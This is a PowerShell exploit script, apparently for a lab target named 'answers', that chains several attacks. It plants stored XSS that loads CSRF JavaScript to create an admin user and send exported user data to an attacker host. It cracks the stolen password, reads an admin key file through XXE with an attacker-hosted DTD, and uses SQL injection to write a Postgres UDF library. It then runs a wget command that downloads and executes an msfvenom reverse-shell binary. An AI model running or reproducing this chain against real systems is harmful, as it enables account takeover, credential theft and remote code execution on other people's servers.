<# Debugging
To use burpsuite proxy for all invoke-webrequests prior to running the script set the following env var:
$env:HTTP_PROXY = 'http://127.0.0.1:8080';
Then start the script as a job, i.e:
Start-Job  {./rce-powershell-large-object.ps1}
Idk why but running a script directly does not make it inherit the env so we must run it as a job
#>
$attacker_ip = '192.168.119.123';
$target_ip = '192.168.123.251';
$username = 'zinhart';
$javascript = @"
const attacker_ip = '$attacker_ip';
const host = 'answers';
const host_ip = '$target_ip';

username = '$username'
email = "zinhart@cucked.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

// Create an Admin user and seed values to crack the users password
doRequest(``http://`${host_ip}/admin/users/create``, config);


// Export the DataBase
config = {
  "method":"GET",
  "credentials":"include",
  mode: "cors",
  headers: {
        "Content-Type": "application/xml"
  },
};
setInterval(() => {
  extractHash(``http://`${host_ip}/admin/export``, config);
}, 100);

// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/endpoint?value=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/status_code?value=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(``http://`${attacker_ip}/exfil?value=`` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
      fetch(``http://`${attacker_ip}/error?value=`` + error, {
        mode: "cors",
      });   
  });
}

// extract hash
function extractHash(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/endpoint?value=`` + endpoint, {
      mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/status_code?value=`` + response.status, {
      mode: "cors",
      });
    if(response.status < 400) {
      let xml_string = await response.text();
      let parser = new DOMParser();
      let xmlDoc = parser.parseFromString(xml_string,"text/xml");
      let users = xmlDoc.getElementsByTagName("user");
      let hash='';
      for(let i = 0; i < users.length; ++i) {
        fetch(``http://`${attacker_ip}/exfil?value=`` + encodeURIComponent(xmlDoc.getElementsByTagName("user")[i].innerHTML), {
          mode: "cors",
        });
      }
  }
  }).catch((error) => {
      fetch(``http://`${attacker_ip}/error?value=`` + error, {
        mode: "cors",
      });   
  });
}
"@
$csrf_payload = New-Item -ItemType File -Path "create-admin-user-csrf.js" -Value $javascript -Force;
$xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.Name)'></script>"
Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"

$start_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
$end_time = '';
Write-Output "Webserver Started, Start simulation";


# Start cors server and wait for exfiled data
$server_job = Start-Job -ScriptBlock { python3 ./simple-cors-http-server.py 80 }
$server_logs = '';
$hash = '';
while($True) {
  $server_logs = Receive-Job -Job $server_job -Keep *>&1;
  $magic_string = $server_logs | Select-String -Pattern ".*$username.*";
  # sls -Pattern '(\?exfil=hash&value=[^\s]+)'
  if($magic_string.Matches.Length -gt 0) {
    #$magic_string.Matches
    $match = $magic_string.Matches.value | Select-String -Pattern '(exfil\?value=[^\s]+)';
    #$match.Matches
    $decodedURLParameters = [System.Web.HttpUtility]::UrlDecode($match.Matches.value)
    $hash = ($decodedURLParameters | Select-String -Pattern '<password>(.*?)</password>').Matches.groups[1].value;
    #$hash
    $end_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
    break;
  }
}


## run password cracker
write-output "Username: $username";
javac PasswordCracker.java;
$pw_crack_res = java PasswordCracker.java "$start_time" "$end_time" "$hash";
$cracked_pw = $pw_crack_res -replace '.*\s';
Write-Output "Found Password: $cracked_pw";
$cracked_pw = [System.Web.HttpUtility]::UrlEncode($cracked_pw); 
# attempt to login to the webapp, note that the session variable is Session
$res = Invoke-WebRequest -uri http://answers/login -Method Post -Body "username=$username&password=$cracked_pw&submit=Submit" -SessionVariable 'Session';
$login_success = $res.rawcontent | Select-String -Pattern "Welcome $username";
# login success proceed with admin key extractions then large object injection
if($login_success.Matches.Count -gt 0) {
  Write-Output "Login Success";
# admin key extraction
$xxe_payload = @"
<!DOCTYPE data [
<!ENTITY % start `"<![CDATA[`">
<!ENTITY % file SYSTEM `"file:///home/student/adminkey.txt`" >
<!ENTITY % end `"]]>`">
<!ENTITY % dtd SYSTEM `"http://$attacker_ip/wrapper.dtd`" >
%dtd;
]>
<database><categories><category><name>&wrapper;</name></category></categories></database>
"@
  $xxe_wrapper = New-Item -ItemType File -Path "wrapper.dtd" -Value '<!ENTITY wrapper "%start;%file;%end;">' -Force;
  $req_body = "preview=true&xmldata=" + [System.Web.HttpUtility]::UrlEncode($xxe_payload);
  $res = Invoke-WebRequest -Uri http://answers/admin/import -Method Post -Body $req_body -Websession $Session;
  # wait for request for wrapper.dtd
  $admin_key = '';
  while($True) {
    $server_logs = Receive-Job -Job $server_job -Keep *>&1;
    $magic_string = $server_logs | Select-String -Pattern ".*wrapper.dtd.*";
    if($magic_string.Matches.Length -gt 0) {
      # Admin Key Extraction
      Write-Output "Received request for wrapper.dtd";
      $admin_key = $res.rawcontent | Select-String -Pattern '\[.*\s';
      $admin_key = $admin_key.Matches.value -replace '\[CDATA\[', ''-replace "`n","" -replace "`r","";
      Write-Output "Admin Key: $admin_key"

      <# sqli on /admin/query example
      $query = 'select version();';
      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$query" -Websession $Session;
      $res.content;
      #>

      # RCE VIA LARGE OBJECT
      # https://infosecwriteups.com/compiling-postgres-library-for-exploiting-udf-to-rce-d8cfd197bdf9
      # 1. follow instructions above to create the postgres.so


      # 2. convert to hex string
      $postgres_so_bytes = [System.IO.File]::ReadAllBytes("./pg_exec.so");
      $postgres_so_hex_string = [System.BitConverter]::toString($postgres_so_bytes).replace('-',''); # the byte converter inserts a '-' every two bytes, so we remove it.

      # 3. write to database via /admin/query
      # 3a. create_schema to store the loid
      $schema_name = (-join (( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 5 | % {[char]$_}));
      $table_name = (-join (( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 5 | % {[char]$_}));
      $create_schema_sqli = "CREATE SCHEMA $schema_name;CREATE TABLE $schema_name.$table_name(loid oid);INSERT INTO $schema_name.$table_name(loid) VALUES ((SELECT lo_creat(-1)));";
      New-Variable -Name loid -Value "(SELECT loid FROM $schema_name.$table_name)" -Option Constant;
      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$create_schema_sqli" -Websession $Session;
      # 3b. inject_udf
      $chunk_length = 4096;
      $postgres_so_hex_string;
      Write-Output "Length hex string length: $($postgres_so_hex_string.length)";
      Write-Output "udf chunk length: $chunk_length";
      #write large object in sizes of 4096(2kbs but the payload is hex characters so 2048 * 2). I tried writing in increments of less than 4096 but it seems to crash postgres, so that's good for ddosing but not for rce. The only value that can be less than 2kb's is the last element in large object table for a specific loid.
      $j=0;
      for($i = 0; $i -lt $postgres_so_hex_string.length; $i+=$chunk_length) {
        $udf_chunk = $postgres_so_hex_string.substring($i, [Math]::Min($chunk_length, $postgres_so_hex_string.length - $i));
        $write_udf_chunk_sqli = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ($loid, $j, decode(`$`$$udf_chunk`$`$, `$`$hex`$`$))";
        $req_body = "adminKey=$admin_key&query=" + $($write_udf_chunk_sqli -replace ' ','+');
        $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body $req_body -Websession $Session;
        $j = $j +1;
      }
      # 3c. export_udf
      $export_udf_sqli = "SELECT lo_export($loid, `$`$/tmp/pg_exec.so`$`$)";
      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$export_udf_sqli" -Websession $Session;
      # 3d. create_udf_func
      $create_udf_func_sqli = "CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT";
      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$create_udf_func_sqli" -Websession $Session;
      # 3e. trigger_udf
      msfvenom -p linux/x86/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -f elf -o reverse.elf
      $trigger_udf_sqli = "SELECT sys('wget http://$attacker_ip/reverse.elf -O /tmp/reverse.elf; chmod +x /tmp/reverse.elf; /tmp/reverse.elf');";
      $trigger_udf_sqli = [System.Web.HttpUtility]::UrlEncode($trigger_udf_sqli);
      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$trigger_udf_sqli" -Websession $Session;
      break;
    }
  }
  
}
else {
  $login_success.Matches;
}
#$server_logs
#Write-Output $start_time $end_time $hash;

# cleanup
Remove-Job -Job $server_job -Force;
Remove-Item -Path $csrf_payload.Name;
Remove-Item '*.class';
Remove-Item -Path $xxe_wrapper.Name;
Remove-Item 'reverse.elf';
